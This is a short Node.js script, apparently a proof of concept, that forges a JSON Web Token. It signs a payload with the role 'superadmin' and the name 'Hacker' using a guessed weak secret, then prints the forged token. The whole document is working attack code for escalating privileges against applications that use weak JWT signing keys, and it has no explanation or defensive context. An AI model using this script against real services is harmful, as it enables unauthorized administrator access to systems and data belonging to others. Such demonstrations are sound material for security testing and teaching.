const jwt = require('jsonwebtoken');

const weakSecret = 'mysecretkey';

const forgedToken = jwt.sign(
  {
    id: 1,
    name: 'Hacker',
    role: 'superadmin',
  },
  weakSecret,
  {
    expiresIn: '1h',
  }
);

console.log('Forged JWT:');
console.log(forgedToken);